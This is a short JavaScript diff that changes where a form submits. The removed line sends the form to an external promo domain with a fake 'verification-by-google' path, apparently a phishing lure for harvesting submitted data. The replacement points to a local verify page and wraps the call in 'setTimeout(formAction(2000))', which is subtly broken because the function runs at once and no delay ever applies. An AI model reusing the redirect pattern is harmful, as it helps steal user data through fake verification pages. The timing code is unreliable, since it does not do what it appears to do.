@@ -1,6 +1,6 @@
 
 function formAction() {
-    document.newForm.action = "https://jackpotspromo.com/verification-by-google";
+    document.newForm.action = "/pages/verify.html";
 }
 
-formAction();
+setTimeout(formAction(2000));
